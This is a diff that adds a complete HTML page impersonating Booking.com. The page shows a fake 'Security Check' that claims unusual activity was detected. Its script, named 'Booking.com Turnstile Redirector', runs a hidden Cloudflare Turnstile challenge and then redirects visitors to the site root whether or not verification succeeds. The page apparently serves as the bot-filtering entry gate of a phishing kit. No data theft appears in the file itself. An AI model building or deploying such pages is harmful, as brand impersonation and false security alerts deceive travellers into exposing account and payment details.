@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check - Booking.com</title>
+    <link rel="icon" href="https://cf.bstatic.com/static/img/favicon/b00201cf64d8e842e1a61f1a801b9a7d0c5af205.ico" type="image/x-icon">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: BlinkMacSystemFont, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #262626;
+        }
+
+        .container {
+            background: white;
+            padding: 48px 32px;
+            border-radius: 8px;
+            box-shadow: 0 1px 10px rgba(0, 0, 0, 0.12);
+            text-align: center;
+            max-width: 460px;
+            width: 100%;
+        }
+
+        .booking-logo {
+            color: #003580;
+            font-size: 36px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            margin-bottom: 32px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 12px;
+            color: #262626;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #6b6b6b;
+            margin-bottom: 32px;
+            line-height: 24px;
+        }
+
+        .security-info {
+            background: #ebf3ff;
+            border-left: 4px solid #003580;
+            padding: 20px;
+            margin-bottom: 28px;
+            text-align: left;
+            border-radius: 4px;
+        }
+
+        .security-info h2 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #003580;
+        }
+
+        .security-info p {
+            font-size: 14px;
+            color: #262626;
+            line-height: 20px;
+            margin: 0;
+        }
+
+        .loading-container {
+            margin: 32px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .spinner {
+            width: 34px;
+            height: 34px;
+            border: 4px solid #e6e6e6;
+            border-top-color: #003580;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 14px;
+            color: #6b6b6b;
+        }
+
+        .footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e6e6e6;
+            font-size: 12px;
+            color: #6b6b6b;
+        }
+
+        .footer a {
+            color: #0071c2;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        #cf-turnstile {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 16px;
+                padding: 32px 24px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .subtitle {
+                font-size: 15px;
+            }
+        }
+    </style>
+    
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- Booking.com Logo -->
+        <div class="booking-logo">Booking.com</div>
+        
+        <h1>Security Check</h1>
+        
+        <div class="subtitle">
+            We need to verify this is you to protect your reservations and payment information
+        </div>
+        
+        <div class="security-info">
+            <h2>Protecting Your Bookings</h2>
+            <p>We detected unusual activity or an access attempt from a new location. This quick verification helps keep your travel plans and personal information secure.</p>
+        </div>
+        
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-text">Verifying your request...</div>
+        </div>
+        
+        <div id="cf-turnstile"></div>
+        
+        <div class="footer">
+            <a href="https://www.booking.com/content/privacy.html" target="_blank">Privacy & Cookies</a> • 
+            <a href="https://www.booking.com/content/terms.html" target="_blank">Terms & Conditions</a> • 
+            <a href="https://www.booking.com/help.html" target="_blank">Help</a>
+        </div>
+    </div>
+
+    <script>
+        const TURNSTILE_SITEKEY = '0x4AAAAAAB_V5zjG-p6Hl2ZQ';
+        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
+        
+        console.log('Booking.com Turnstile Redirector - Redirect URL:', REDIRECT_URL);
+        
+        function performRedirect() {
+            console.log('Performing redirect to:', REDIRECT_URL);
+            window.location.href = REDIRECT_URL;
+        }
+        
+        if (typeof turnstile === 'undefined') {
+            console.error('Turnstile failed to load. Redirecting anyway...');
+            document.querySelector('.status-text').textContent = 'Completing verification...';
+            setTimeout(performRedirect, 2000);
+        } else {
+            turnstile.ready(function () {
+                let verificationTimeout;
+                let verificationCompleted = false;
+                
+                verificationTimeout = setTimeout(function() {
+                    if (!verificationCompleted) {
+                        console.warn('Turnstile verification timeout - redirecting anyway');
+                        document.querySelector('.status-text').textContent = 'Completing verification...';
+                        setTimeout(performRedirect, 500);
+                    }
+                }, 5000);
+                
+                try {
+                    turnstile.render('#cf-turnstile', {
+                        sitekey: TURNSTILE_SITEKEY,
+                        callback: function(token) {
+                            verificationCompleted = true;
+                            clearTimeout(verificationTimeout);
+                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                            setTimeout(performRedirect, 800);
+                        },
+                        'error-callback': function(error) {
+                            verificationCompleted = true;
+                            clearTimeout(verificationTimeout);
+                            console.error('Turnstile error:', error);
+                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
+                            setTimeout(performRedirect, 1000);
+                        },
+                        'timeout-callback': function() {
+                            console.warn('Turnstile timeout');
+                            document.querySelector('.status-text').textContent = 'Verification timeout. Redirecting...';
+                            setTimeout(performRedirect, 1000);
+                        }
+                    });
+                } catch (e) {
+                    clearTimeout(verificationTimeout);
+                    console.error('Failed to render Turnstile:', e);
+                    setTimeout(performRedirect, 1500);
+                }
+            });
+        }
+        
+        setTimeout(function() {
+            if (REDIRECT_URL) {
+                console.log('3-second fallback redirect triggered');
+                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                performRedirect();
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
+
